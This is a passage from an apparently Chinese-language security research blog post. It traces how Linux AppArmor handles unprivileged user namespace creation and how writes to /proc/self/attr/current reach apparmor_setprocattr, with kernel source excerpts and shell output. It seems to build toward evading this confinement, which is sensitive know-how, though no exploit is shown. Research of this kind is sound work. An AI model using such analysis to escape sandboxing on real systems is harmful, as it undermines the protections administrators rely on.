            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [5]&lt;/span&gt;
                         &lt;span class=&quot;s&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                         &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hard_coded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* [...] */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;hard_coded:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_apply_modes_to_perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;要怎麼判斷目前程式所使用的 AppArmor 設定檔呢？直覺上，這類資訊應該會被記錄在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/&lt;/code&gt; 底下的某個檔案中。透過分析原始碼，並搭配 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; 等工具搜尋關鍵字後，我們找到了目標位置：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;這個目錄用來儲存程式的屬性設定，其中有一個子目錄名為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor&lt;/code&gt;，專門存放與 AppArmor 有關的資訊。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /proc/self/attr
total 0
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 current
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 fscreate
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 keycreate
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 prev
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 sockcreate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/apparmor&lt;/code&gt; 目錄下的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current&lt;/code&gt; 檔案，用來顯示當前程式所使用的 AppArmor 設定檔。雖然這個檔案具備寫入權限，但實際上要讓修改生效，必須使用特定格式寫入內容，否則系統會忽略這些操作。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/self/attr/current
unconfined

aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;AAA &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/self/attr/current
&lt;span class=&quot;nt&quot;&gt;-bash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;: write error: Invalid argument
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過將這些檔案名稱對應回原始碼，我們可以從檔案操作的定義中，找出處理讀寫請求的函式，進而了解這些檔案實際上是如何被使用的。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define ATTR(LSMID, NAME, MODE)             \
    NOD(NAME, (S_IFREG|(MODE)),             \
        NULL, &amp;amp;proc_pid_attr_operations,    \
        { .lsmid = LSMID })
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smack_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_SMACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;fscreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;keycreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sockcreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;smack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apparmor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;變數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_operations&lt;/code&gt; 是這些檔案所使用的檔案操作表，其中寫入行為會由函式 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_write()&lt;/code&gt; [6] 處理。往下追蹤這個函式的實作，可以看到它會呼叫 LSM 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setprocattr&lt;/code&gt; hook，而對應到 AppArmor 的實作就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; [7]。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_operations&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_operations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [6]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROC_I&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hlist_for_each_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;security_hook_heads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [7]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函式 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; 首先會將目標屬性的名稱轉換成對應的列舉值 [8]，接著再呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; 來實際處理該操作 [9]。&lt;/p&gt;

